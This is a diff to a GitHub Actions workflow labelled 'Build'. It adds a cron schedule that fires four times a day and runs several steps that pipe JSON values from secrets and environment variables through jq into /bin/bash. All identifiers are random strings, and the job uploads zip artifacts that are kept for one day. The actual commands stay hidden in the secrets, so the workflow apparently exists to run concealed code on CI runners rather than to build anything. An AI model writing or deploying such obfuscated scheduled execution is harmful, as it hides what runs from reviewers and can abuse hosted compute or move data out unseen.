@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '56 4,10,16,22 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -13,16 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          elp3449: ${{ secrets.elp3449 }}
+          ldak71820: ${{ secrets.ldak71820 }}
         run: |
-          printf '%s' "$elp3449" | jq -r .bpqg3255 | /bin/bash
-          echo $cakl469 | jq -r .m83 | /bin/bash
-          echo $vw8 | jq -r .mkbia719 | /bin/bash
-          printf '%s' "$s3" | jq -r .vmzsu5055 | /bin/bash
+          printf '%s' "$ldak71820" | jq -r .ebrhg47 | /bin/bash
+          printf '%s' "$tx2833" | jq -r .gaypp1 | /bin/bash
+          echo $q72 | jq -r .oj2 | /bin/bash
+          printf '%s' "$uc84462" | jq -r .dyxg6 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: 1FVltIu0
+          name: mFZ6F4Eb
           path: "*.zip"
           retention-days: 1
